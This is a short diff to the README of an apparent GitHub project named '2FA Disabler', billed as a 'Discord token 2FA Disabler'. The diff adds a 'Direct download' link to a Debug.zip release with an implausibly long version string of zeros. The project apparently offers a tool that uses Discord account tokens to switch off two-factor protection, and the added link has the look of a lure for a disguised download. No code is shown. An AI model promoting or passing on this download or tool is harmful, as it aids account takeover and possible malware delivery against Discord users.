@@ -1,3 +1,5 @@
+## [Direct download](https://github.com/HS-Dev-org/2FA-Disabler/releases/download/0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1/Debug.zip)
+
 # 2FA Disabler
 Discord token 2FA Disabler
 
